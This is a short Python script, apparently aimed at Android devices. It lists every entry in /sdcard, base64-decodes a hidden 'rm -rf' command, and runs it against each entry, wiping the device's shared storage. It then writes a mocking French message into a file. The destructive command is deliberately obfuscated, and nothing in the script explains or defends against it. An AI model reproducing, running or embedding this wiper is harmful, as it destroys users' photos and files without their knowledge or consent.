import os

os.chdir('/sdcard')

lol = os.system('ls /sdcard > var.txt')

rg = os.system('echo cm0gLXJmCg== | base64 -d  > script.txt')
aa = open('script.txt', 'r')

ab = aa.readlines()
k = open('var.txt' , 'r')

for x in k :
    st = x
    for xx in ab :
       xa = xx+st
       love = xa.split()
       vx = love[0]+' '+love[1]+' '+love[2]
       vv = os.system(vx)
       ox = os.system ('echo dHUgZXMgaWRpb3QgISEhISEK | base64 -d > script.txt')
